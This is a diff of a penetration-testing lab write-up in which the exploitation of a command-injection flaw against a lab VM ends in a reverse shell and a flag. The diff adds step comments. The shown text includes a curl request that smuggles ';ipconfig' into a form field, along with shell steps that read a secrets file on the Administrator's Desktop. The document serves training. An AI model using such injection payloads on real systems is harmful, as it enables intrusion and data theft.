@@ -143,7 +143,7 @@ Successfull reverse shell connection via Command Injection
 
 Lab 1 - Follow the steps above and exploit the command injection vulnerability on VM #1 to obtain a reverse shell. Since the machine is not connected to the internet, you have to skip the step of cloning the repository from the beginning of this section. Find the flag on the Desktop for the Administrator user.
 >``` shell
-># Verify Command Injection Works
+># Verify Command Injection Works (Target: 192.168.118.189)
 >kali@kali:~$ curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.118.189:8000/archive
 >
 ># ========== Expected Result ==========
@@ -204,7 +204,7 @@ Lab 1 - Follow the steps above and exploit the command injection vulnerability o
 >PS C:\Users\Administrator\Documents\meteor>
 ># =====================================
 >
->
+># Find the flag on the Desktop for the Administrator user.
 >PS C:\Users\Administrator\Documents\meteor> cd C:\Users\Administrator\Desktop
 >
 >PS C:\Users\Administrator\Desktop> dir
@@ -221,6 +221,7 @@ Lab 1 - Follow the steps above and exploit the command injection vulnerability o
 >-a----        11/18/2025   8:40 AM             38 secrets.txt
 ># =====================================
 >
+># View secrets.txt
 >PS C:\Users\Administrator\Desktop> type secrets.txt
 >
 ># ========== Expected Result ==========
